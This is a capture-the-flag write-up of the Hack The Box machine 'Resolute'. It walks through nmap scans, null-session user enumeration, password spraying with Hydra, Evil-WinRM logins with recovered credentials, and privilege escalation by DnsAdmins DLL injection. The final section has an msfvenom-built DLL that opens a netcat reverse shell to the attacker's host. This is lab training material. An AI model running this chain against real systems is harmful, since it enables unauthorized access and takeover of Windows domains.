I start off with an nmap scan:
└─# nmap -sC -sV -A 10.10.10.169
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-06-19 13:33:34Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped

Host script results:
|_clock-skew: mean: 2h28m52s, deviation: 4h02m32s, median: 8m50s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2021-06-19T06:34:39-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-06-19T13:34:40
|_  start_date: 2021-06-19T13:32:0

A full port scan reveals so many ports:
└─# nmap -p- --min-rate 10000 10.10.10.169
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49686/tcp open  unknown
49713/tcp open  unknown
49915/tcp open  unknown

Enumerating users using rpcclient (this can also be done using enum4linux):
└─# rpcclient 10.10.10.169 -U '' -N 
rpcclient $> enumdomusers
Administrator
Guest
krbtgt
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
claude
melanie
zach
simon
naoki
Running enum4linux returns some info:
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!

We need to find who still has this default password set.

└─# hydra -L users -P pass.txt 10.10.10.169 smb
[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!
evil-winrm -u 'MEGABANK\melanie' -p 'Welcome123!' -i 10.10.10.169
*Evil-WinRM* PS C:\Users\melanie\desktop> type user.txt
0c3be45fcfe249796ccbee8d3a978540

Search for hidden files:
Get-ChildItem C:\ -Recurse -Force -ErrorAction SilentlyContinue | Where { ($_.Attributes.ToString() -Split ", ") -Contains "Hidden" } | Select FullName
 
C:\PSTranscripts\20191203
C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

*Evil-WinRM* PS C:\PSTranscripts\20191203> dir
*Evil-WinRM* PS C:\PSTranscripts\20191203> gci -force
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

===========================
Priveleges Escalation
===========================
ryan: Serv3r4Admin4cc123!
└─# evil-winrm -u 'MEGABANK\ryan' -p 'Serv3r4Admin4cc123!' -i 10.10.10.169
*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all
Groups : MEGABANK\DnsAdmins   
I need a way to exploit DNS; Will do this through injecting a DLL;
1. Build a custom DLL. Once loaded by DNS, it should give me a reverse shell
2. Open up a local server accessible by remote/victim machine. (smb server)
3. Open a netcat listener
4. Execute the dnscmd cli to inject the DLL
5. Spawn a root shell.
Get needed info, machine's architecture : $env:PROCESSOR_ARCHITECTURE => AMD64
To build the malicious DLL, I use msfvenom:
1. msfvenom -p windows/x64/exec CMD='\\10.10.14.11\PLUGIN\nc.exe 10.10.14.11 4444 -e cmd.exe' -f dll > privesc_plugin.dll 
2. └─# python smbserver.py share '/home/joe/Downloads/htb/oscp/windows/resolute' -smb2support;
net use Z: \\10.10.14.11\plugin
3. dnscmd resolute /config /serverleveldll \\10.10.14.11\PLUGIN\privesc_plugin.dll 
4. sc.exe \\resolute stop dns
5. sc.exe \\resolute start dns


Reference : https://ctf.terkiba.com/resolute/

